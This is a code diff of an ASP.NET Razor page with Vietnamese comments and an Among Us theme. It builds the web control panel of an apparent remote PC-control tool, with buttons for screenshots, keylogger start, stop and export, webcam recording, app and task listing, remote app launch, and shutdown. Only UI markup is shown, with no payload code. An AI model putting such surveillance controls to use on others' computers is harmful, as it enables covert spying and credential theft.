@@ -9,6 +9,7 @@
 <link href="https://fonts.googleapis.com/css2?family=Amatic+SC:wght@400;700&family=Coiny&family=VT323&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
+@* Các nhân vật Among Us trang trí *@
 <div class="au-char-red"></div>
 <div class="au-char-blue"></div>
 <div class="au-char-ghost"></div>
@@ -27,29 +28,75 @@
     </div>
 
     <div class="row">
+        @* CỘT ĐIỀU KHIỂN (Bên trái) *@
         <div class="col-lg-4 order-mobile-2">
             <div class="control-panel p-2">
+
+                @* 1. Chụp màn hình *@
                 <button class="btn btn-among-us w-100" onclick="guiLenh('Screenshot', this)">
                     <i class="fas fa-camera"></i> CHỤP MÀN HÌNH
                 </button>
-                <button class="btn btn-among-us w-100" onclick="guiLenh('KeyLogger', this)">
-                    <i class="fas fa-keyboard"></i> LẤY KEYLOG
-                </button>
-                <button class="btn btn-among-us w-100" onclick="guiLenh('WebcamList', this)">
-                    <i class="fas fa-video"></i> DANH SÁCH CAMERA
-                </button>
 
-                <div id="webcamControls" style="display:none;" class="mb-3">
-                    <select id="webcamSelect" class="btn-among-us" style="font-size: 14px; background: #000;"></select>
-                    <button class="btn btn-stop w-100" onclick="recordWebcam()">
-                        <i class="fas fa-circle"></i> QUAY CLIP 10S
+                @* 2. Mục Webcam *@
+                <div class="webcam-section mb-3">
+                    <button class="btn btn-among-us w-100" onclick="toggleWebcamMenu()">
+                        <i class="fas fa-video"></i> WEBCAM <i class="fas fa-chevron-down float-end" id="webcamIcon"></i>
                     </button>
+                    <div id="webcamDropdown" class="collapsible-content">
+                        <div class="control-panel-inner p-3 mt-1" style="background: rgba(0,0,0,0.5); border-radius: 8px; border: 1px dashed var(--among-cyan);">
+                            <label style="font-family: 'VT323'; color: #aaa; font-size: 14px;">CHỌN THIẾT BỊ:</label>
+                            <select id="webcamSelect" class="btn-among-us w-100 mb-3" style="font-size: 14px; background: #000; color: var(--among-cyan);">
+                                <option>Đang tải danh sách...</option>
+                            </select>
+                            <div class="d-flex gap-2">
+                                <button class="btn btn-stop flex-fill" onclick="recordWebcam()">
+                                    <i class="fas fa-circle"></i> QUAY 10S
+                                </button>
+                            </div>
+                        </div>
+                    </div>
                 </div>
+
+                @* 3. Hệ thống Keylog *@
+                <div class="keylogger-section mb-3">
+                    <button class="btn btn-among-us w-100" onclick="toggleKeylogMenu()">
+                        <i class="fas fa-keyboard"></i> HỆ THỐNG KEYLOG <i class="fas fa-chevron-down float-end" id="keylogIcon"></i>
+                    </button>
+                    <div id="keylogDropdown" class="collapsible-content">
+                        <div class="control-panel-inner p-3 mt-2" style="background: rgba(0,0,0,0.5); border-radius: 8px; border: 1px dashed var(--among-cyan);">
+                            <div class="d-flex gap-2 mb-2">
+                                <button id="btnStartKeylog" class="btn btn-start flex-fill" onclick="controlKeylog('Start')">
+                                    <i class="fas fa-play"></i> BẬT
+                                </button>
+                                <button id="btnStopKeylog" class="btn btn-stop flex-fill" onclick="controlKeylog('Stop')">
+                                    <i class="fas fa-stop"></i> TẮT
+                                </button>
+                            </div>
+                            <div class="d-flex gap-2">
+                                <button class="btn btn-among-us flex-fill" onclick="xuatDuLieuTablet()">
+                                    <i class="fas fa-download"></i> XUẤT DỮ LIỆU
+                                </button>
+                                <button class="btn btn-among-us flex-fill" style="background-color: #ff4444; border-color: #b91d1d;" onclick="clearTablet()">
+                                    <i class="fas fa-eraser"></i> XÓA MÀN HÌNH
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                @* 4. Quản lý Task & App *@
+                <button class="btn btn-among-us w-100" onclick="guiLenh('ListInstalledApp', this)">
+                    <i class="fas fa-th-list"></i> ỨNG DỤNG ĐÃ CÀI ĐẶT
+                </button>
+                <button class="btn btn-among-us w-100" onclick="guiLenh('ListRunningApp', this)">
+                    <i class="fas fa-window-restore"></i> ỨNG DỤNG ĐANG CHẠY
+                </button>
 
                 <button class="btn btn-among-us w-100" onclick="guiLenh('ListTask', this)">
                     <i class="fas fa-microchip"></i> XEM TÁC VỤ
                 </button>
 
+                @* 5. Chạy ứng dụng *@
                 <div class="mt-3">
                     <input id="appNameInput" placeholder="Nhập đường dẫn App..."
                            style="width:100%; padding:10px; border-radius:8px; border:2px solid #555; background: #000; color: #fff; margin-bottom:10px;" />
@@ -60,21 +107,34 @@
             </div>
         </div>
 
+        @* CỘT HIỂN THỊ TABLET (Bên phải) *@
         <div class="col-lg-8 order-mobile-1">
             <div class="tablet-container">
-                <div class="tablet-screen" id="displayArea">
+                <div class="tablet-screen" id="displayArea" style="overflow-y: auto;">
+
+                    @* Spinner khi đang load *@
                     <div id="loadingSpinner" style="display:none; color: var(--among-cyan); text-align: center; margin-top: 20%;">
                         <i class="fas fa-spinner fa-spin fa-3x"></i><br>ĐANG TRUY XUẤT...
                     </div>
+
+                    @* Vùng đồ họa cho Task/App (MỚI) *@
+                    <div id="gridResult" class="task-list-container" style="display:none;"></div>
+
+                    @* Hiển thị Hình ảnh *@
                     <img id="imgResult" style="display:none; width: 100%;" />
+
+                    @* Hiển thị Video *@
                     <video id="videoResult" controls style="display:none; width: 100%;"></video>
-                    <pre id="textResult" style="display:none; padding: 15px; font-family: 'VT323'; color: #0f0; font-size: 18px;"></pre>
+
+                    @* Hiển thị Văn bản/Keylog *@
+                    <pre id="textResult" style="display:none; padding: 15px; font-family: 'VT323'; color: #0f0; font-size: 18px; white-space: pre-wrap; word-wrap: break-word;"></pre>
                 </div>
             </div>
 
+            @* Hệ thống nút nguồn *@
             <div class="d-flex gap-3 justify-content-center mt-2">
                 <button class="btn btn-warning flex-fill" onclick="sysAction('Restart')">
-                    <i class="fas fa-sync-alt fa-spin-hover"></i> RESTART
+                    <i class="fas fa-sync-alt"></i> RESTART
                 </button>
                 <button class="btn btn-danger flex-fill" onclick="sysAction('Shutdown')">
                     <i class="fas fa-power-off"></i> SHUTDOWN
@@ -83,5 +143,7 @@
         </div>
     </div>
 </div>
+
+<div id="toastContainer" class="toast-container position-fixed top-0 end-0 p-3" style="z-index: 9999;"></div>
 
 <script src="~/js/among-us.js" asp-append-version="true"></script>
